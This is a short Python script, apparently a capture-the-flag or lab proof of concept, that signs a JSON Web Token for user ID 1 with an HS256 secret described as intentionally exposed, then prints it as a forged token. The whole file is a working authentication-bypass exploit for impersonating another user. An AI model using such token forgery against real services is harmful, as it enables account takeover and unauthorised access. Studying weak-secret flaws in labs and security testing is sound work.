import jwt
import time

# Weak secret (intentionally exposed)
secret = "Gibberish, jibberish, jibber-jabber and gobbledygook"

# Create payload for user ID 1
payload = {
    "userId": 1,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600  # 1 hour expiry
}

# Generate token
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Forged JWT: {token}")